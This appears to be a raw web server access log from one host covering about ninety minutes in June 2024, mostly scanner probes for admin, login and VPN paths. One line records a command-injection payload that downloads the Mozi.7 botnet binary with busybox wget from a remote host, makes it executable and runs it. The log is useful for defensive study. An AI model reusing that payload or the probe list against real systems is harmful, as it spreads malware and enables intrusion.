198.235.24.162 - - [08/Jun/2024:23:50:49 +0000] "GET / HTTP/1.1" 200 753 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
59.83.208.103 - - [08/Jun/2024:23:54:26 +0000] "GET /indice.html HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
175.24.212.162 - - [08/Jun/2024:23:54:26 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
175.24.212.162 - - [08/Jun/2024:23:54:29 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
220.196.160.144 - - [08/Jun/2024:23:54:29 +0000] "GET /indice.html HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.124 - - [08/Jun/2024:23:54:29 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/indice.html" "curl/7.54.0" "-"
220.196.160.101 - - [08/Jun/2024:23:54:30 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/indice.html" "curl/7.54.0" "-"
220.196.160.146 - - [08/Jun/2024:23:54:30 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/indice.html" "curl/7.54.0" "-"
220.196.160.144 - - [08/Jun/2024:23:54:33 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/indice.html" "curl/7.54.0" "-"
220.196.160.51 - - [08/Jun/2024:23:54:53 +0000] "GET /localstart.cfm HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
106.55.201.50 - - [08/Jun/2024:23:54:53 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
106.55.201.50 - - [08/Jun/2024:23:54:55 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
220.196.160.117 - - [08/Jun/2024:23:54:56 +0000] "GET /localstart.cfm HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.117 - - [08/Jun/2024:23:54:56 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/localstart.cfm" "curl/7.54.0" "-"
220.196.160.146 - - [08/Jun/2024:23:54:56 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/localstart.cfm" "curl/7.54.0" "-"
220.196.160.117 - - [08/Jun/2024:23:54:57 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/localstart.cfm" "curl/7.54.0" "-"
220.196.160.95 - - [08/Jun/2024:23:54:57 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/localstart.cfm" "curl/7.54.0" "-"
95.214.27.7 - - [09/Jun/2024:00:00:53 +0000] "GET /config HTTP/1.1" 200 753 "-" "Go-http-client/1.1" "-"
220.196.160.76 - - [09/Jun/2024:00:01:55 +0000] "GET /base.jhtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
49.234.34.31 - - [09/Jun/2024:00:01:55 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
49.234.34.31 - - [09/Jun/2024:00:01:57 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
220.196.160.95 - - [09/Jun/2024:00:01:58 +0000] "GET /base.jhtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.144 - - [09/Jun/2024:00:01:58 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/base.jhtml" "curl/7.54.0" "-"
220.196.160.101 - - [09/Jun/2024:00:01:58 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/base.jhtml" "curl/7.54.0" "-"
220.196.160.61 - - [09/Jun/2024:00:01:58 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/base.jhtml" "curl/7.54.0" "-"
220.196.160.95 - - [09/Jun/2024:00:02:02 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/base.jhtml" "curl/7.54.0" "-"
180.101.244.15 - - [09/Jun/2024:00:17:25 +0000] "GET /base.shtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
49.234.34.31 - - [09/Jun/2024:00:17:26 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
49.234.34.31 - - [09/Jun/2024:00:17:28 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
59.83.208.103 - - [09/Jun/2024:00:17:29 +0000] "GET /base.shtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
180.101.244.14 - - [09/Jun/2024:00:17:29 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/base.shtml" "curl/7.54.0" "-"
180.101.245.250 - - [09/Jun/2024:00:17:29 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/base.shtml" "curl/7.54.0" "-"
180.101.245.248 - - [09/Jun/2024:00:17:30 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/base.shtml" "curl/7.54.0" "-"
59.83.208.103 - - [09/Jun/2024:00:17:33 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/base.shtml" "curl/7.54.0" "-"
180.101.244.13 - - [09/Jun/2024:00:18:37 +0000] "GET /default.cfm HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
129.211.162.158 - - [09/Jun/2024:00:18:37 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/default.cfm" "curl/7.54.0" "-"
59.83.208.106 - - [09/Jun/2024:00:18:37 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/default.cfm" "curl/7.54.0" "-"
180.101.245.250 - - [09/Jun/2024:00:18:38 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/default.cfm" "curl/7.54.0" "-"
180.101.244.13 - - [09/Jun/2024:00:18:39 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/default.cfm" "curl/7.54.0" "-"
87.121.69.52 - - [09/Jun/2024:00:19:46 +0000] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-" "-"
198.235.24.208 - - [09/Jun/2024:00:21:13 +0000] "GET / HTTP/1.0" 200 753 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
95.214.27.7 - - [09/Jun/2024:00:21:54 +0000] "GET /config HTTP/1.1" 200 753 "-" "Go-http-client/1.1" "-"
220.196.160.151 - - [09/Jun/2024:00:22:47 +0000] "GET /index.php HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.154 - - [09/Jun/2024:00:22:47 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/index.php" "curl/7.54.0" "-"
220.196.160.101 - - [09/Jun/2024:00:22:47 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/index.php" "curl/7.54.0" "-"
220.196.160.151 - - [09/Jun/2024:00:22:47 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/index.php" "curl/7.54.0" "-"
220.196.160.76 - - [09/Jun/2024:00:22:47 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/index.php" "curl/7.54.0" "-"
220.196.160.61 - - [09/Jun/2024:00:23:23 +0000] "GET /admin.pl HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.76 - - [09/Jun/2024:00:23:23 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/admin.pl" "curl/7.54.0" "-"
220.196.160.154 - - [09/Jun/2024:00:23:23 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/admin.pl" "curl/7.54.0" "-"
220.196.160.117 - - [09/Jun/2024:00:23:23 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/admin.pl" "curl/7.54.0" "-"
220.196.160.61 - - [09/Jun/2024:00:23:25 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/admin.pl" "curl/7.54.0" "-"
180.101.244.15 - - [09/Jun/2024:00:26:00 +0000] "GET /index.asp HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
59.83.208.106 - - [09/Jun/2024:00:26:01 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/index.asp" "curl/7.54.0" "-"
59.83.208.106 - - [09/Jun/2024:00:26:01 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/index.asp" "curl/7.54.0" "-"
180.101.244.15 - - [09/Jun/2024:00:26:02 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/index.asp" "curl/7.54.0" "-"
180.101.245.248 - - [09/Jun/2024:00:26:04 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/index.asp" "curl/7.54.0" "-"
180.101.244.13 - - [09/Jun/2024:00:32:26 +0000] "GET /start.jhtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
180.101.245.247 - - [09/Jun/2024:00:32:26 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/start.jhtml" "curl/7.54.0" "-"
59.83.208.105 - - [09/Jun/2024:00:32:26 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/start.jhtml" "curl/7.54.0" "-"
180.101.244.15 - - [09/Jun/2024:00:32:27 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/start.jhtml" "curl/7.54.0" "-"
180.101.244.13 - - [09/Jun/2024:00:32:28 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/start.jhtml" "curl/7.54.0" "-"
180.101.245.248 - - [09/Jun/2024:00:34:48 +0000] "GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
106.55.201.50 - - [09/Jun/2024:00:34:49 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
106.55.201.50 - - [09/Jun/2024:00:34:51 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
59.83.208.104 - - [09/Jun/2024:00:34:51 +0000] "GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
59.83.208.103 - - [09/Jun/2024:00:34:51 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/dana-cached/hc/HostCheckerInstaller.osx" "curl/7.54.0" "-"
59.83.208.103 - - [09/Jun/2024:00:34:51 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/dana-cached/hc/HostCheckerInstaller.osx" "curl/7.54.0" "-"
59.83.208.107 - - [09/Jun/2024:00:34:52 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/dana-cached/hc/HostCheckerInstaller.osx" "curl/7.54.0" "-"
59.83.208.104 - - [09/Jun/2024:00:34:55 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/dana-cached/hc/HostCheckerInstaller.osx" "curl/7.54.0" "-"
220.196.160.45 - - [09/Jun/2024:00:37:48 +0000] "GET /user HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.96 - - [09/Jun/2024:00:37:48 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/user" "curl/7.54.0" "-"
220.196.160.75 - - [09/Jun/2024:00:37:48 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/user" "curl/7.54.0" "-"
220.196.160.154 - - [09/Jun/2024:00:37:48 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/user" "curl/7.54.0" "-"
220.196.160.45 - - [09/Jun/2024:00:37:48 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/user" "curl/7.54.0" "-"
220.196.160.146 - - [09/Jun/2024:00:39:11 +0000] "GET /docs/cplugError.html/ HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.144 - - [09/Jun/2024:00:39:11 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/docs/cplugError.html/" "curl/7.54.0" "-"
220.196.160.154 - - [09/Jun/2024:00:39:11 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/docs/cplugError.html/" "curl/7.54.0" "-"
220.196.160.84 - - [09/Jun/2024:00:39:11 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/docs/cplugError.html/" "curl/7.54.0" "-"
220.196.160.146 - - [09/Jun/2024:00:39:13 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/docs/cplugError.html/" "curl/7.54.0" "-"
220.196.160.154 - - [09/Jun/2024:00:39:46 +0000] "GET /Lmn5 HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.117 - - [09/Jun/2024:00:39:46 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/Lmn5" "curl/7.54.0" "-"
220.196.160.75 - - [09/Jun/2024:00:39:46 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/Lmn5" "curl/7.54.0" "-"
220.196.160.96 - - [09/Jun/2024:00:39:47 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/Lmn5" "curl/7.54.0" "-"
220.196.160.154 - - [09/Jun/2024:00:39:48 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/Lmn5" "curl/7.54.0" "-"
95.214.27.7 - - [09/Jun/2024:00:41:01 +0000] "GET /config HTTP/1.1" 200 753 "-" "Go-http-client/1.1" "-"
220.196.160.75 - - [09/Jun/2024:00:42:47 +0000] "GET /default.php HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
106.55.200.233 - - [09/Jun/2024:00:42:47 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
106.55.200.233 - - [09/Jun/2024:00:42:49 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
220.196.160.144 - - [09/Jun/2024:00:42:50 +0000] "GET /default.php HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.65 - - [09/Jun/2024:00:42:50 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/default.php" "curl/7.54.0" "-"
220.196.160.76 - - [09/Jun/2024:00:42:50 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/default.php" "curl/7.54.0" "-"
220.196.160.117 - - [09/Jun/2024:00:42:50 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/default.php" "curl/7.54.0" "-"
220.196.160.144 - - [09/Jun/2024:00:42:54 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/default.php" "curl/7.54.0" "-"
95.214.27.7 - - [09/Jun/2024:00:53:43 +0000] "GET /config HTTP/1.1" 200 753 "-" "Go-http-client/1.1" "-"
59.83.208.105 - - [09/Jun/2024:01:01:15 +0000] "GET /home.shtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
180.101.245.246 - - [09/Jun/2024:01:01:15 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/home.shtml" "curl/7.54.0" "-"
129.211.162.158 - - [09/Jun/2024:01:01:15 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/home.shtml" "curl/7.54.0" "-"
180.101.244.12 - - [09/Jun/2024:01:01:17 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/home.shtml" "curl/7.54.0" "-"
59.83.208.105 - - [09/Jun/2024:01:01:18 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/home.shtml" "curl/7.54.0" "-"
180.101.245.246 - - [09/Jun/2024:01:02:32 +0000] "GET /indice.jhtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
106.55.200.233 - - [09/Jun/2024:01:02:33 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
106.55.200.233 - - [09/Jun/2024:01:02:35 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
180.101.244.13 - - [09/Jun/2024:01:02:36 +0000] "GET /indice.jhtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
180.101.244.16 - - [09/Jun/2024:01:02:36 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/indice.jhtml" "curl/7.54.0" "-"
180.101.245.253 - - [09/Jun/2024:01:02:36 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/indice.jhtml" "curl/7.54.0" "-"
180.101.244.13 - - [09/Jun/2024:01:02:36 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/indice.jhtml" "curl/7.54.0" "-"
180.101.244.12 - - [09/Jun/2024:01:02:38 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/indice.jhtml" "curl/7.54.0" "-"
180.101.245.250 - - [09/Jun/2024:01:07:59 +0000] "GET /base.php HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
180.101.245.248 - - [09/Jun/2024:01:07:59 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/base.php" "curl/7.54.0" "-"
180.101.244.14 - - [09/Jun/2024:01:07:59 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/base.php" "curl/7.54.0" "-"
180.101.245.250 - - [09/Jun/2024:01:08:02 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/base.php" "curl/7.54.0" "-"
180.101.245.248 - - [09/Jun/2024:01:08:04 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/base.php" "curl/7.54.0" "-"
220.196.160.125 - - [09/Jun/2024:01:08:48 +0000] "GET /admin.asp HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.125 - - [09/Jun/2024:01:08:48 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/admin.asp" "curl/7.54.0" "-"
220.196.160.117 - - [09/Jun/2024:01:08:48 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/admin.asp" "curl/7.54.0" "-"
220.196.160.61 - - [09/Jun/2024:01:08:48 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/admin.asp" "curl/7.54.0" "-"
220.196.160.125 - - [09/Jun/2024:01:08:49 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/admin.asp" "curl/7.54.0" "-"
220.196.160.125 - - [09/Jun/2024:01:09:04 +0000] "GET /inicio.php HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.76 - - [09/Jun/2024:01:09:04 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/inicio.php" "curl/7.54.0" "-"
220.196.160.53 - - [09/Jun/2024:01:09:04 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/inicio.php" "curl/7.54.0" "-"
220.196.160.125 - - [09/Jun/2024:01:09:04 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/inicio.php" "curl/7.54.0" "-"
220.196.160.84 - - [09/Jun/2024:01:09:07 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/inicio.php" "curl/7.54.0" "-"
180.101.245.246 - - [09/Jun/2024:01:09:53 +0000] "GET /main.cgi HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
59.83.208.105 - - [09/Jun/2024:01:09:53 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/main.cgi" "curl/7.54.0" "-"
59.83.208.106 - - [09/Jun/2024:01:09:53 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/main.cgi" "curl/7.54.0" "-"
180.101.244.14 - - [09/Jun/2024:01:09:53 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/main.cgi" "curl/7.54.0" "-"
180.101.245.246 - - [09/Jun/2024:01:09:56 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/main.cgi" "curl/7.54.0" "-"
39.89.175.48 - - [09/Jun/2024:01:11:24 +0000] "27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a HTTP/1.0" 400 157 "-" "-" "-"
180.101.244.14 - - [09/Jun/2024:01:12:28 +0000] "GET /index.shtml HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
180.101.245.253 - - [09/Jun/2024:01:12:28 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/index.shtml" "curl/7.54.0" "-"
180.101.244.13 - - [09/Jun/2024:01:12:28 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/index.shtml" "curl/7.54.0" "-"
180.101.244.14 - - [09/Jun/2024:01:12:29 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/index.shtml" "curl/7.54.0" "-"
59.83.208.108 - - [09/Jun/2024:01:12:29 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/index.shtml" "curl/7.54.0" "-"
220.196.160.75 - - [09/Jun/2024:01:13:00 +0000] "GET /main.aspx HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.61 - - [09/Jun/2024:01:13:01 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/main.aspx" "curl/7.54.0" "-"
220.196.160.117 - - [09/Jun/2024:01:13:01 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/main.aspx" "curl/7.54.0" "-"
220.196.160.75 - - [09/Jun/2024:01:13:01 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/main.aspx" "curl/7.54.0" "-"
220.196.160.75 - - [09/Jun/2024:01:13:04 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/main.aspx" "curl/7.54.0" "-"
95.214.27.7 - - [09/Jun/2024:01:14:26 +0000] "GET /config HTTP/1.1" 200 753 "-" "Go-http-client/1.1" "-"
220.196.160.101 - - [09/Jun/2024:01:16:21 +0000] "GET /admin.php HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.144 - - [09/Jun/2024:01:16:21 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/admin.php" "curl/7.54.0" "-"
220.196.160.125 - - [09/Jun/2024:01:16:22 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/admin.php" "curl/7.54.0" "-"
220.196.160.73 - - [09/Jun/2024:01:16:22 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/admin.php" "curl/7.54.0" "-"
220.196.160.101 - - [09/Jun/2024:01:16:24 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/admin.php" "curl/7.54.0" "-"
220.196.160.154 - - [09/Jun/2024:01:17:38 +0000] "GET /admin.aspx HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
81.71.5.172 - - [09/Jun/2024:01:17:38 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
81.71.5.172 - - [09/Jun/2024:01:17:41 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
59.83.208.108 - - [09/Jun/2024:01:17:42 +0000] "GET /admin.aspx HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
180.101.244.13 - - [09/Jun/2024:01:17:42 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/admin.aspx" "curl/7.54.0" "-"
180.101.244.15 - - [09/Jun/2024:01:17:42 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/admin.aspx" "curl/7.54.0" "-"
180.101.245.251 - - [09/Jun/2024:01:17:42 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/admin.aspx" "curl/7.54.0" "-"
59.83.208.108 - - [09/Jun/2024:01:17:45 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/admin.aspx" "curl/7.54.0" "-"
220.196.160.84 - - [09/Jun/2024:01:22:13 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.61 - - [09/Jun/2024:01:22:13 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/+CSCOE+/logon.html" "curl/7.54.0" "-"
220.196.160.124 - - [09/Jun/2024:01:22:13 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/+CSCOE+/logon.html" "curl/7.54.0" "-"
220.196.160.45 - - [09/Jun/2024:01:22:13 +0000] "GET /css/chunk-vendors.9821e974.css HTTP/1.1" 200 321069 "http://82.156.202.232:8081/+CSCOE+/logon.html" "curl/7.54.0" "-"
220.196.160.84 - - [09/Jun/2024:01:22:13 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "http://82.156.202.232:8081/+CSCOE+/logon.html" "curl/7.54.0" "-"
59.83.208.103 - - [09/Jun/2024:01:22:39 +0000] "GET /base.inc HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
49.234.34.31 - - [09/Jun/2024:01:22:40 +0000] "GET /js/chunk-vendors.2f43c38d.js HTTP/1.1" 200 1076477 "-" "Go-http-client/1.1" "-"
49.234.34.31 - - [09/Jun/2024:01:22:42 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "-" "Go-http-client/1.1" "-"
220.196.160.154 - - [09/Jun/2024:01:22:43 +0000] "GET /base.inc HTTP/1.1" 200 753 "-" "curl/7.54.0" "-"
220.196.160.96 - - [09/Jun/2024:01:22:43 +0000] "GET /css/app.1f68041f.css HTTP/1.1" 200 18132 "http://82.156.202.232:8081/base.inc" "curl/7.54.0" "-"
220.196.160.84 - - [09/Jun/2024:01:22:43 +0000] "GET /js/app.02be24b7.js HTTP/1.1" 200 81759 "http://82.156.202.232:8081/base.inc" "curl/7.54.0" "-"
